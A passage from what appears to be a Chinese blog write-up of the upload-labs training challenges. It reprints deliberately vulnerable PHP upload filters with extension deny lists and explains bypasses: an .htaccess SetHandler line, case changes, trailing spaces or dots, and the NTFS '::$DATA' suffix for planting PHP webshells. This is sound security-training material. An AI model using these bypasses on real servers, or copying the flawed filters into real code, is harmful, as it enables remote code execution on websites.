class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>几乎过滤了全部，但是<strong>htaccess</strong>还存活着。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
<p>作用是把所有文件解析成<strong>php</strong>，这个时候上传图片马就行了。</p>
<h4 id="pass-05">Pass-05</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>全过滤了，但是没有转换成小写，因此改成<strong>phP</strong>就可以了。</p>
<h4 id="pass-06">Pass-06</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>源码和<strong>Pass-05</strong>对比少了一个首尾去空，可以抓包后在后缀多加一个空格。</p>
<h5 id="原理">原理</h5>
<p><strong>trim(string,charlist)</strong>这个函数是用来删除字符串左右两边的<strong>charlist</strong>字符的，若空则删除空格。</p>
<p>此处利用了<strong>Windows</strong>下的特性，就是文件名为<strong>filename.php.</strong>的话保存的时候最后一个点会被去掉，变成了<strong>filename.php</strong>。</p>
<h4 id="pass-07">Pass-07</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对比<strong>Pass-06</strong>，并没有删除最后的点，因此抓包修改文件名最后加<strong>.</strong>就好了。</p>
<h4 id="pass-08">Pass-08</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看代码，没有删除<strong>::$DATA</strong>这一串。</p>
<p>利用<strong>Windows</strong>的特性，因为保存的时候不会保存这一串，因此抓包修改后缀为<strong>php::$DATA</strong>得以绕过。</p>
<h5 id="原理-1">原理</h5>
<p>【抄自<a
href="http://www.lmxspace.com/2018/06/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Ewriteup/"><strong>L1nk3r</strong></a>学长的博客。</p>
<p><strong>NTFS</strong>是微软<strong>Windows
NT</strong>内核的系列操作系统支持的，是为了解决网络和磁盘配额，文件加密等安全特性所设计的磁盘格式，比<strong>FAT</strong>文件系统更加稳定，也更加安全。</p>
<p><strong>NTFS-ADS</strong>，又称为<strong>NTFS</strong>交换数据流，是<strong>NTFS</strong>磁盘格式的一个特性。</p>
<p>在<strong>NTFS</strong>文件系统下，每个文件都可以存在多个数据流，也就是说，除了主文件流之外，还可以有很多非主文件流寄宿在主文件流中。虽然我们无法看到数据流文件，但是它是真实存在于我们系统之中的。</p>
<p>格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;</span><br></pre></td></tr></table></figure>
<p>有如下<strong>Payload</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpinfo.php:jpg</span><br></pre></td></tr></table></figure>
<p>流类型以<strong>$</strong>开头，默认流类型为<strong>data</strong>，如上<strong>Payload</strong>的完整形式其实是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpinfo.php:jpg:$data</span><br></pre></td></tr></table></figure>
<p>文件内容在数据流文件中，我们当初上传的就是一个文件流文件，之所以会顺带生成<strong>phpinfo.php</strong>，是因为它没有找到自己的宿主文件，所以才创建了一个。</p>
<p>同理<strong>phpinfo.php::$DATA</strong>可以写入文件，是因为它确实向<strong>phpinfo.php</strong>写入了内容。</p>
<h4 id="pass-09">Pass-09</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span 